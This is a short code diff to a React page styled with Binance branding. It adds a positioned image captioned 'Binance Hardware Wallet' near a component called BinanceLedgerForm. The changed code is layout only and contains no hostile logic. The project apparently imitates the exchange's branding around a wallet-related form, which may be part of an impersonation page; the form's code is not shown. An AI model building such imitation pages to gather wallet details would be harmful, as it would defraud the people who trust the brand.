@@ -1,4 +1,3 @@
-
 import React, { useState, useEffect } from "react";
 import BinanceHeader from "@/components/BinanceHeader";
 import BinanceFooter from "@/components/BinanceFooter";
@@ -26,7 +25,7 @@ const Index = () => {
     <div className="min-h-screen flex flex-col bg-binance-dark text-white">
       <BinanceHeader />
       
-      <main className="flex-grow">
+      <main className="flex-grow relative">
         {/* Hero Section - made more compact */}
         <div className="bg-binance-dark py-6 md:py-10 relative overflow-hidden">
           <div className="container mx-auto px-4">
@@ -96,6 +95,15 @@ const Index = () => {
           </div>
           
           <BinanceLedgerForm />
+        </div>
+
+        {/* Hand device image positioned at bottom right, emerging from footer */}
+        <div className="absolute bottom-0 right-4 md:right-8 lg:right-12 z-30 pointer-events-none">
+          <img 
+            src="/lovable-uploads/ea19be95-c092-4f08-b3eb-02f472f9ec1f.png" 
+            alt="Binance Hardware Wallet" 
+            className="w-32 md:w-40 lg:w-48 h-auto transform translate-y-8 md:translate-y-12"
+          />
         </div>
       </main>
       
